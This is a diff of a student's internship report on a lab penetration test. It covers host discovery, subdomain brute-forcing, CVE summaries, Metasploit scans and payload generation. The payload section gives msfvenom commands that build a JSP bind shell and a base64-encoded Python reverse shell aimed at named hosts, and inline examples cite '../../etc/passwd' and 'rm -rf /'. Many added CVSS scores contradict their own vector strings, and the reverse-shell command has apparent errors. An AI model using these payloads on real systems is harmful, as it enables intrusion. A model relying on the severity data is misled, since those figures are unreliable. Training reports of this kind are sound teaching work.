@@ -1,42 +1,78 @@
-# INTERNAL PENETRATION TESTING #
-INTERNSHIP REPORT 1  
+# INTERNAL PENETRATION TESTING
+  ## INTERNSHIP REPORT   
 
     NAME: ASARE PRINCE ANSAH
 
-    PROGRAM: TELECOMMUNICATIONS ENGINEERING
+    INDEX NUMBER: 7164021
+
+    PROGRAM: TELECOMMUNICATIONS 
+    ENGINEERING
 
     YEAR: THREE (3)  
 
-    TUTOR: SOMUAH  
+    TUTOR: MASTER SOMUAH OBED
 
     COMAPANY: VIRTUAL INFOSEC AFRICA (VIA) 
 
     PERIOD: 2ND TO 27TH SEPTEMBER, 2024
 
-## **TABLE OF CONTENTS** ## 
+## TABLE OF CONTENTS
 
 + Host Discovery
-    + scope 
-    + reviews 
+    + Explanation
+    + Ping and list scans
+    + Host reconnaissance
+    + Aiodnsbrute
   
 + Service discovery and port scanning
-    + scope 
-    + reviews 
+    + Port sweep
+    + Service discovery
+    + Importance of port and service discovery
+    + Service separation into protocols
   
++ Summary of Findings
+    + Incomplete fix of Apache server		
+    + Null pointer dereference		
+    + MySQL Server DDL Privilege Escalation
+    + SQL Denial of Service	
+    + RealVNC Local Privilege Escalation		
+    + Local Code Execution in Microsoft Terminal Services		
+    + SMTP Smuggling		
+    + Exim DNSDB Out-of-Bounds Read Information Disclosure	
+    + Elevation of Privilege
+    + BSD telnetd Sensitive Environment Variable Exposure		
+    + Remote Code Execution via Buffer Overflow		
+    + Shell bind in Java		
+    + Reverse shell bind in Python
+  
++ Quality severity rating 
+    + CVSS v3.1 table 
 + Vulnerability Scanning
-    + scope
-    + reviews 
+    + Metasploit scans
+        + MySQL scans
+        + VNC scans
+        + RDP scans
+        + SMB scans
+    + Custom list creation
+        + Situations for the need of custom list
   
 + Web based attack surfaces
-    + scope 
-    + reviews 
+    + Eyewitness scan 
+        + Definitions
+        + Importance of eyewitness
   
 + Payload Generation 
-    + scope
-    + reviews
+    + Java payloads
+        + Command usage
+        + Victims
+    + Python payloads
+        + Command usage 
+        + Victims
+    + Payloads folder 
 
-### **HOST DISCOVERY** ###
-### **Explanation** ###
+
+### HOST DISCOVERY
+### Explanation
 It refers to the process of identifying which hosts (computers or devices) are active and responsive on a network. When performing penetration testing, this is often the first step before proceeding with more detailed scans. Host discovery allows you to find out which systems are up and which are down, helping to narrow the focus for further analysis.
 
 ### Ping scan   
@@ -52,7 +88,7 @@ It refers to the process of identifying which hosts (computers or devices) are a
 The command lists all the hosts in the 10.10.10.0/24 network without sending any packets to them. This is a non-intrusive way to quickly identify active hosts on the network.
 below is the screenshot of the command and the result yielded  
 
-### **Host Reconnaissance** ###
+### Host Reconnaissance
 1. Perform the host discovery again and save the output in a grepable format to a file.
    - *command = nmap -sL 10.10.10.0/24 -oG hosts_up.txt*
   
@@ -75,22 +111,23 @@ below is the screenshot of the command and the result yielded
 
 5. Analyze the results.
 
-### **AIODNSBRUTE** ###  
+### AIODNSBRUTE
 It is a Python library that provides an asynchronous DNS brute-force attack tool. It allows you to efficiently enumerate subdomains of a target domain by attempting to resolve them using DNS queries.
+
+**Command**  
+aiodnsbrute -w /usr/share/wordlists/dnsmap.txt virtualinfosecafrica.txt
 
 ![alt text](<Screenshot from 2024-09-14 13-43-29.png>)  
 
 Three subdomains were found after bruteforcing the domain virtualinfosecafrica.  
     
-  | Subdomain                      | Ip address     |
+  |Subdomain                      | Ip address     |
   | -----------                    | ------------   |
   | 1. ftp.virtualinfosecafrica.com   | 192.185.23.171 |
   | 2. whm.virtualinfosecafrica.com   | 192.185.23.171 |
   | 3. www.virtualinfosecafrica.com   | 192.185.23.171 |
-|||
 
-##  **SERVICE DISCOVERY and PORT SCANNING** ##  
-### 
+##  SERVICE DISCOVERY and PORT SCANNING
 
 **PORT SWEEP**  
     Helps identify which ports are open on a target system. Each port may represent a different service or application running on the server.    
@@ -117,7 +154,6 @@ Three subdomains were found after bruteforcing the domain virtualinfosecafrica.
 |Investigate Incidents| In case of a security incident, understanding the services and ports involved can help in diagnosing and responding to the issue effectively.|
 |Resource Utilization| Identifying services and their associated ports helps in understanding resource utilization and optimizing network performance.|
 |Capacity Planning| Helps in planning for capacity and scaling by understanding the load and demands on different services.|
-|||
 
 **SEPARATION OF SERVICE DISCOVERY INTO REPECTIVE PROTOCOLS**  
 
@@ -137,16 +173,40 @@ COMMANDS
   
    - awk '/ \ /udp/ {print $2, $4}' scan_results.gnmap > udp_ports_summary.txt
 
-*NOTE:*   
-The services (https, http, vnc, telnet, mysql, rdp,smtp, ssl,netbios-ssn and microsoft-ds) were all grouped under the tcp ports. 
+NOTE   
+*The services (https, http, vnc, telnet, mysql, rdp,smtp, ssl,netbios-ssn and microsoft-ds) were all grouped under the tcp ports.* 
 
 
-## MITRE CVE DATABASE ##
+## SUMMARY OF FINDINGS 
+|Findings|Severity Score|Severity Status|
+|---------|---------|---------|
+|Incomplete fix of Apache server||
+|Null pointer dereference||
+|MySQL Server DDL Privilege Escalation|4.4|Medium|
+|SQL Denial of Service|4.9|Medium|
+|RealVNC Local Privilege Escalation||
+|Local Code Execution in Microsoft Terminal Services||
+|SMTP Smuggling||
+|Exim DNSDB Out-of-Bounds Read Information Disclosure|3.1|Low|
+|Elevation of Privilege|7.8|High|
+|BSD telnetd Sensitive Environment Variable Exposure||
+|Remote Code Execution via Buffer Overflow||
+|Shell bind in Java||
+|Reverse shell bind in Python||
 
-### Apache Limitation: Incomplete fix of CVE-2021-41773 ###
+
+## MITRE CVE DATABASE 
+
+### Apache Limitation: Incomplete fix of CVE-2021-41773 
 
 **Description**  
 It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
+
+
+CVSS 
+|score|severity|version|vector string|
+|--------|--------|--------|--------|
+|7.5|High|4.0|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|
 
   
   **Solution**  
@@ -157,12 +217,17 @@ It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was in
 
 
 
-### **Apache Limitation: Null pointer dereference in h2 fuzzing**
+### Apache Limitation: Null pointer dereference in h2 fuzzing
 
 **Desription**  
 While fuzzing the 2.4.49 httpd, a new null pointer dereference was detected during HTTP/2 request processing, allowing an external source to DoS the server.   
 
 The problem of "null pointer dereference in h2 fuzzing" typically arises when the fuzzing process encounters an unexpected input that causes the H2 server to attempt to access a memory location that is not allocated or has been deallocated. This can lead to crashes, unexpected behavior, or potential security vulnerabilities.
+
+CVSS
+|score|severity|version|vector string|
+|--------|--------|--------|--------|
+|7.5|High|3.1|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|
 
 **Solution**  
 * improved input validation
@@ -176,17 +241,16 @@ The problem of "null pointer dereference in h2 fuzzing" typically arises when th
 ### Limitation: MySQL Server DDL Privilege Escalation Vulnerability
 
 **Description**  
-Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: DDL). Supported versions that are affected are 5.6.49 and prior, 5.7.31 and prior and 8.0.21 and prior. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.4 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H).
+Vulnerability in the MySQL Server product of Oracle MySQL server DDL. Supported versions that are affected are 5.6.49 and prior, 5.7.31 and prior and 8.0.21 and prior. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.4 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H).
 
 CVSS
 |score|severity|version|vector string|
 |--------|--------|--------|--------|
 |4.4|medium|3.1|CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H|
-||||
 
 **Solution**
-* network segmentaion
-* upgrade to a patched version 
+* Network segmentaion
+* Upgrade to a patched version 
 
 **Victims**
 10.10.10.5, 10.10.10.40
@@ -204,7 +268,7 @@ CVSS
 |score|severity|version|vector string|
 |--------|--------|--------|--------|
 |4.9|medium|3.1|CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H|
-||||
+
 
 **Solution**
 * update to the latest version
@@ -221,7 +285,10 @@ CVSS
 **Description**
 The vulnerability in **RealVNC VNC Server (before version 6.11.0)** and **VNC Viewer (before version 6.22.826)** on Windows allows local privilege escalation through the MSI installer’s Repair mode. This flaw enables a local attacker to gain elevated privileges on the system, potentially leading to unauthorized actions or system control. The issue can be exploited by users with limited access, allowing them to escalate privileges and compromise system security. 
 
-No CVSS provided
+CVSS 
+|score|severity|version|vector string|
+|--------|--------|--------|--------|
+|7.8|High|3.1|CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H|
 
 **Solution**
 * Updating to the latest versions of VNC Server and Viewer is recommended.
@@ -232,12 +299,18 @@ No CVSS provided
 10.10.10.10
 
 
-### Microsoft Terminal Services Limitation: Local Code Execution Vulnerability
+### Microsoft Terminal Services Limitation: Remote Code Execution Vulnerability
 
 **Description**  
-A vulnerability in Microsoft Terminal Server occurs when the **Start program at logon** and **Override settings from user profile and Client Connection Manager wizard** options are enabled. This configuration allows local users to force an Explorer error, which can be exploited to execute arbitrary code. Though these options were designed for user convenience, they can unintentionally provide a means for attackers to bypass intended restrictions and compromise the system.
+A vulnerability in Microsoft Terminal Server occurs when the **Start program at logon** and **Override settings from user profile and Client Connection Manager wizard** options are enabled. This configuration allows local users to force an Explorer error, which can be exploited to execute arbitrary code. Though these options were designed for user convenience, they can unintentionally provide a means for attackers to bypass intended restrictions and compromise the system.  
+CVE-2021-31166
+   A vulnerability in the HTTP Protocol Stack that affects RDP services and could allow attackers to gain control of the server.
 
-NO CVSS
+CVSS 
+|score|severity|version|vector string|
+|--------|--------|--------|--------|
+|9.8|Critical|3.1|CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H|
+
 
 **Solution**  
 * diable start program at logon
@@ -257,7 +330,7 @@ CVSS
 |score|severity|version|vector string|
 |--------|--------|--------|--------|
 |7.8|High|3.1|CCVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C|
-||||
+
 
 **Solution**  
 * Reconfigure folder redirection with offline files
@@ -277,7 +350,10 @@ CVSS
 **Description**  
 In Exim versions prior to 4.97.1, there is a vulnerability related to SMTP smuggling in specific PIPELINING/CHUNKING configurations. This issue arises because Exim accepts a certain character sequence (<LF>.<CR><LF>), which some other email servers do not. Attackers can exploit this vulnerability to inject emails with spoofed sender addresses, thereby bypassing the Sender Policy Framework (SPF) protection that prevents email spoofing. The vulnerability can allow unauthorized mail to be accepted and delivered by vulnerable mail servers.
 
-NO CVSS provided
+CVSS 
+|score|severity|version|vector string|
+|--------|--------|--------|--------|
+|7.5|High|3.1|CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H|
 
 **Solution**  
 * upgrade to the latest version of Exim
@@ -300,7 +376,6 @@ CVSS
 |score|severity|version|vector string|
 |--------|--------|--------|--------|
 |3.1|Low|3.0|CVSS:3.0/AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N|
-||||
 
 **Solution**  
 * Update to latest version
@@ -321,7 +396,10 @@ CVSS
 **Description**  
 A vulnerability exists in certain BSD-based Telnet clients, including those on Solaris and SuSE Linux, where remote malicious Telnet servers can exploit the NEW-ENVIRON option using the SEND ENV_USERVAR command. This allows the attacker to read sensitive environment variables, potentially exposing confidential information such as user credentials or system configurations. The vulnerability arises from improper handling of environment variables during Telnet sessions.
 
-NO CVSS
+CVSS 
+|score|severity|version|vector string|
+|--------|--------|--------|--------|
+|0.0|None*|3.1|CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H|
 
 **Solution**
 * Disable Telnet and use secure alternatives
@@ -338,12 +416,16 @@ NO CVSS
 * [http://securitytracker.com/id?1014203]()
 
 
-### Limitation 2: RCE via Buffer Ovrflow
+### Limitation 2: RCE via Buffer Overflow
 
 **Description**  
  buffer overflow vulnerability exists in the BSD-based Telnet daemon (telnetd) across various operating systems. The flaw occurs when the telrcv function improperly handles specific telnet options, including the "AYT (Are You There)" command. This vulnerability allows remote attackers to overflow the buffer and execute arbitrary commands on the affected system, potentially leading to system compromise.
 
- NO CVSS provided
+ CVSS 
+|score|severity|version|vector string|
+|--------|--------|--------|--------|
+|9.8|Critical|3.1|CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H|
+
 
  **Solution**
  * Disable Telnet and use secure alternatives
@@ -361,7 +443,7 @@ NO CVSS
 
 ### QUALITY SEVERITY RATING
 
-CVSS v3.X Rating
+**CVSS v4.0 Rating**
 
 |Severity|Score range|
 |--------|-------------|
@@ -371,7 +453,19 @@ CVSS v3.X Rating
 |High|7.0 - 8.9|
 |Critical|9.0 - 10.0|
 
-## EXPLOITDB ##
+**CVSS Breakdown**
+|||
+|------|-----|
+|Attack Vector (AV)| Network (N) – The attack can be carried out remotely.|
+|Attack Complexity (AC)| Low (L) – Buffer overflow attacks typically do not require complex conditions.|
+|Privileges Required (PR)| None (N) – The attacker usually does not need prior access.|
+|User Interaction (UI)| None (N) – The attack can often occur without user intervention.|
+|Confidentiality (C)| High (H) – Successful exploitation could allow an attacker to execute arbitrary code.|
+|Integrity (I)| High (H) – The attacker can modify or inject code.|
+|Availability (A)| High (H) – The application or system may crash or be made unavailable.|
+
+
+## EXPLOITDB 
    
 **Apache httpd 2.4.49**    
 It is an http service version type
@@ -379,18 +473,45 @@ It is an http service version type
 **Limitation**  
  Path traversal and remote code execution
 
+**Brief description**  
+Path traversal (also known as directory traversal) is a type of vulnerability where an attacker can manipulate the file system path used in a web application to access files and directories that are outside the intended directory. This allows the attacker to potentially view or download sensitive files, such as configuration files, password files, or source code, that the application should not expose.
+
+    Example Attack: An attacker may use patterns like ../../etc/passwd to access the system's password file if proper security measures are not in place.
+
+Remote code execution occurs when an attacker can execute arbitrary code on a target system. This can happen due to various vulnerabilities like buffer overflows, deserialization flaws, or improper validation of user input. With RCE, an attacker can take complete control of the affected system, execute malicious commands, steal data, or escalate privileges.
+
+    Example Attack: By exploiting an RCE vulnerability, an attacker could run commands like rm -rf / to delete files on the server.
+
 ![alt text](<Screenshot from 2024-09-15 22-33-19.png>)
 
 **Victims**  
 10.10.10.2,10.10.10.30, 10.10.10.45, 10.10.10.55
 
-**solution**  
-  Updating Apache HTTP Server to version 2.4.51 or later is the recommended solution.
+**Solution**  
+  * Apply patches and update to Apache HTTP Server to version latest version
+  * Whitelist filenames
+  * Usage of security libraries
+  * Use absolute path
 
 **MySQL 5.6.49**  
 
 **Limitation 1**  
 User Privilege Escalation
+
+**Brief description**  
+A situation where an attacker gains elevated access to a system that they are not authorized to have. This allows them to perform actions or access sensitive information that would normally be restricted to higher-privileged users such as system administrators. Privilege escalation can happen in two ways:
+
+    Vertical Privilege Escalation: An attacker gains higher-level access than they are authorized for, moving from a standard user account to an administrator or root account.
+
+    Horizontal Privilege Escalation: An attacker accesses another user’s privileges at the same level, allowing them to impersonate or access data as a different user.
+
+Causes of Privilege Escalation
+
+    Unpatched Vulnerabilities: Exploiting software bugs that grant unintended access.
+    Weak Access Controls: Poor implementation of permissions or user roles.
+    Misconfigurations: Incorrect system settings that allow unauthorized privilege elevation.
+    Insecure File Permissions: Sensitive files or executables that can be manipulated by lower-privileged users.
+    Social Engineering: Tricking a user into giving up credentials or executing malicious code.
 
 ![alt text](<Screenshot from 2024-09-15 22-35-16.png>)
 
@@ -398,11 +519,23 @@ User Privilege Escalation
 10.10.10.5, 10.10.10.40
 
 **Solution**
-* network segmentaion
-* upgrade to a patched version 
+* Network segmentaion
+* Upgrade to a patched version
+* Use PoLP
+* Restrict access to sensitive files 
  
 **Limitation 2**   
 Local Credentials Disclosure
+
+**Brief description**  
+A security vulnerability where sensitive information, such as usernames, passwords, or other authentication credentials, is exposed on a local machine. This type of vulnerability allows attackers with access to the affected system to retrieve stored credentials, potentially escalating privileges or gaining unauthorized access to services, networks, or databases.
+
+Occurs through various means, including:
+
+  * Misconfigured services or file permissions
+  * Storing passwords in plain text
+  * Weak encryption methods
+  * Credentials left in log files or caches
 
 ![alt text](<Screenshot from 2024-09-15 22-35-48.png>)
 
@@ -459,10 +592,11 @@ VNC server DoS
 * Restrict VNC
 * Use strong password
 
-## **Vulnerability Scanning** ##  
-## Vulnerability Scanning with Metasploit Auxiliary Module: Focusing on MySQL, VNC, RDP, and SMB
+## Vulnerability Scanning
+Vulnerability Scanning with Metasploit Auxiliary Module: Focusing on MySQL, VNC, RDP, and SMB.  
 
-**Metasploit** is a powerful penetration testing framework that can be used to identify and exploit vulnerabilities in various services and applications. When assessing the security of a network, it's essential to conduct vulnerability scanning to identify potential weaknesses that could be exploited by malicious actors.
+## Metasploit  
+A powerful penetration testing framework that can be used to identify and exploit vulnerabilities in various services and applications. When assessing the security of a network, it's essential to conduct vulnerability scanning to identify potential weaknesses that could be exploited by malicious actors.
 
 ### MySQL Vulnerability Scanning
 
@@ -492,11 +626,14 @@ VNC server DoS
 
 ### SMB Vulnerability Scanning
 
-* **EternalBlue:** Metasploit has modules for exploiting vulnerabilities like EternalBlue, which have been used in ransomware attacks.
+* **EternalBlue**  
+Metasploit has modules for exploiting vulnerabilities like EternalBlue, which have been used in ransomware attacks.
   
-* **SMB Relay:** Be aware of SMB relay attacks, which can be used to gain unauthorized access to network resources.
+* **SMB Relay**  
+Be aware of SMB relay attacks, which can be used to gain unauthorized access to network resources.
   
-* **SMB Signing:** Ensure that SMB signing is enabled to protect against spoofing attacks.
+* **SMB Signing**  
+Ensure that SMB signing is enabled to protect against spoofing attacks.
 
 ![alt text](<Screenshot from 2024-09-16 00-04-07.png>)
 
@@ -511,9 +648,9 @@ Cewl (Custom Word List generator) is a tool that extracts words from web pages t
 
 ![alt text](<Screenshot from 2024-09-16 00-40-14.png>)
 
-## Situations When a Custom Wordlist is Needed:
+## NECCESITY OF CUSTOM WORDLIST
 
-**Password Cracking:**  
+**Password Cracking**  
 * Target-Specific Attacks   
   When performing password cracking against a target's system or application, using a custom wordlist tailored to the target's context (e.g., company names, product names) can be more effective than generic wordlists.
 
@@ -535,11 +672,12 @@ Cewl (Custom Word List generator) is a tool that extracts words from web pages t
  
    When testing internal network tools or systems, a custom wordlist can help in discovering weak or default credentials that are relevant to the internal environment.
 
-## WEB-BASED ATTACK SURFACES ##
+## WEB-BASED ATTACK SURFACES 
 
 **EyeWitness** is a tool used to automate the process of gathering information about web services by taking screenshots of websites, identifying default credentials, and providing quick access to web application metadata. It's particularly useful for penetration testers, security analysts, and researchers when assessing web applications across multiple hosts.
 
-### Features:
+### Features
+
 - **Screenshots**: Captures screenshots of websites, which helps in quickly reviewing exposed web services.
 - **Web Application Scanning**: Focuses on web services and supports both HTTP and HTTPS.
 - **Metadata Collection**: Gathers information such as HTTP headers and title pages to give insights into the services running.
@@ -549,22 +687,24 @@ Cewl (Custom Word List generator) is a tool that extracts words from web pages t
 ![alt text](<Screenshot from 2024-09-16 01-37-37.png>)
 
 
-## Payload Generation ##
+## PAYLOAD GENERATION 
 
-***Java Payload***  
+**JAVA PAYLOAD**  
 I will use the command below to generate the payload and later drop it on the apache tomcat webserver in order to get a shell bind .
 
-**Command:** 
+**COMMAND:**   
 msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f raw > bind_shell.jsp
 
 ![alt text](<Screenshot from 2024-09-16 01-54-08.png>)
 
+**VICTIM**  
+10.10.10.55
 
-***Python Payload***  
+**PYTHON PAYLOAD**  
 1. Generate a reverse shell payload that will be encoded in base64.  
    * Reverse shell bind command  
 
-   * Encode python oayload to base64
+   * Encode python payload to base64
    
 2. Send the base64 payload to the Python server running on the target host 10.10.10.30.
    
@@ -572,7 +712,21 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f raw > bind_shell.jsp
    
 4. Connect to the shell using the Netcat tool.
 
-## Payloads Folder ##  
+**COMMAND**  
+msfvenom -p python/shell_reverse_sctp LHOSTS=10.10.10.30 -f python -e cmd/base64 -o payloads.py
+
+![alt text](<Screenshot from 2024-09-17 07-29-45.png>)
+
+**VICTIM**   
+10.10.10.30
+
+## PAYLOADS FOLDER 
+Below is a folder that contains java and python payload files.
 
 ![alt text](<Screenshot from 2024-09-16 02-08-55.png>)
+
+
+
+
+
 
